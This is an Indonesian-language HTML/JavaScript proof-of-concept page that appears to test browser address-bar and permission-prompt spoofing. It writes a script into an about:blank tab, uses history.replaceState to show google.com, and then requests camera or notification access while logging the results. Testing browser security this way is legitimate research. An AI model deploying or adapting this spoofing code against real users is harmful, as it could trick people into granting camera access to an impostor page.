<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pure Address Bar & Permission Spoof</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
  h1 { color: #ff6b6b; border-bottom: 2px solid #ff6b6b; padding-bottom: 10px; margin-bottom: 20px; }
  .panel { background: #16213e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #0f3460; }
  button { padding: 14px 24px; background: #e94560; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin: 5px; font-size: 15px; font-weight: bold; width: 100%; }
  button:hover { background: #c73650; }
  #log { background: #0a0a15; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; font-size: 12px; border: 1px solid #0f3460; }
  .success { color: #4caf50; font-weight: bold; }
  .error { color: #f44336; }
  .info { color: #2196f3; }
  .warn { color: #ff9800; font-weight: bold; }
</style>
</head>
<body>

<h1>🔍 Pure Address Bar & Permission Spoof</h1>

<div class="panel">
  <p style="color:#aaa; margin-bottom:20px;">Menguji apakah URL di address bar bisa diubah menjadi Google saat meminta izin kamera/notifikasi.</p>
  <button id="btnCamera">1. Request Kamera (Ubah Address Bar ke Google)</button>
  <button id="btnNotif">2. Request Notifikasi (Ubah Address Bar ke Google)</button>
  <button id="clear" style="background:#555; margin-top:10px;">Bersihkan Log</button>
</div>

<div id="log">Menunggu perintah...</div>

<script>
(function() {
  'use strict';

  const logEl = document.getElementById('log');

  function log(msg, type = '') {
    const time = new Date().toISOString().substr(11, 8);
    const line = `[${time}] ${msg}\n`;
    const span = document.createElement('span');
    if (type) span.className = type;
    span.textContent = line;
    logEl.appendChild(span);
    logEl.scrollTop = logEl.scrollHeight;
    console.log(msg);
  }

  // ============================================
  // LOGIKA UTAMA: ABOUT:BLANK + HISTORY MANIPULATION + PERMISSION
  // ============================================
  function runSpoofTest(type) {
    log(`=== MENGUJI: ${type.toUpperCase()} ===`, 'info');

    // 1. Buka tab about:blank
    const win = window.open('about:blank', '_blank');
    if (!win) { log('❌ Popup diblokir. Izinkan popup.', 'error'); return; }
    log('Tab about:blank dibuka.', 'success');

    // 2. Tulis script langsung ke about:blank
    try {
      win.document.open();
      // Script minimalis, tanpa UI, hanya manipulasi URL dan request izin
      win.document.write(`
        <!DOCTYPE html>
        <html>
        <head><title>Sistem Keamanan</title></head>
        <body style="font-family:sans-serif; text-align:center; padding-top:50px;">
          <p>Memproses permintaan...</p>
          <script>
            (function() {
              // A. Coba manipulasi URL Address Bar ke Google
              try {
                history.replaceState({}, 'Google', 'https://www.google.com');
                parent.postMessage({ status: 'url_spoof_success', url: 'https://www.google.com' }, '*');
              } catch(e) {
                parent.postMessage({ status: 'url_spoof_fail', error: e.name + ': ' + e.message }, '*');
              }

              // B. Coba minta izin
              setTimeout(function() {
                if ('${type}' === 'camera') {
                  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                      .then(function(stream) {
                        parent.postMessage({ status: 'camera_granted' }, '*');
                      })
                      .catch(function(err) {
                        parent.postMessage({ status: 'camera_error', error: err.name }, '*');
                      });
                  }
                } else if ('${type}' === 'notification') {
                  if ('Notification' in window) {
                    Notification.requestPermission().then(function(p) {
                      if (p === 'granted') {
                        parent.postMessage({ status: 'notif_granted' }, '*');
                      } else {
                        parent.postMessage({ status: 'notif_denied' }, '*');
                      }
                    }).catch(function(e) {
                      parent.postMessage({ status: 'notif_error', error: e.message }, '*');
                    });
                  }
                }
              }, 1000); // Delay 1 detik agar address bar sempat diubah
            })();
          <\/script>
        </body>
        </html>
      `);
      win.document.close();
      log('Script injeksi berhasil dikirim.', 'success');
    } catch (e) {
      log('❌ Gagal menulis ke about:blank: ' + e.message, 'error');
      return;
    }

    // 3. Listener pesan dari tab baru
    window.addEventListener('message', (e) => {
      if (e.data && e.data.status) {
        const s = e.data.status;
        if (s === 'url_spoof_success') log('🎯 Address Bar BERHASIL diubah ke: ' + e.data.url, 'success');
        else if (s === 'url_spoof_fail') log('❌ Address Bar GAGAL diubah: ' + e.data.error, 'error');
        else if (s === 'camera_granted') log('🎯 IZIN KAMERA DIBERIKAN!', 'success');
        else if (s === 'camera_error') log('❌ Kamera ditolak: ' + e.data.error, 'error');
        else if (s === 'notif_granted') log('🎯 IZIN NOTIFIKASI DIBERIKAN!', 'success');
        else if (s === 'notif_denied') log('❌ Notifikasi ditolak.', 'error');
      }
    }, { once: false });

    log('Perhatikan ADDRESS BAR tab baru:', 'warn');
    log('1. Apakah berubah jadi google.com?', 'info');
    log('2. Saat prompt izin muncul, apakah tertulis "artha231.github.io" atau "Google"?', 'info');
  }

  // ============================================
  // TOMBOL HANDLERS
  // ============================================
  document.getElementById('btnCamera').onclick = () => runSpoofTest('camera');
  document.getElementById('btnNotif').onclick = () => runSpoofTest('notification');

  document.getElementById('clear').onclick = () => {
    logEl.textContent = '';
    log('Log dibersihkan.', 'info');
  };

  log('PoC murni siap. Pilih tombol di atas.', 'info');
})();
</script>
</body>
</html>
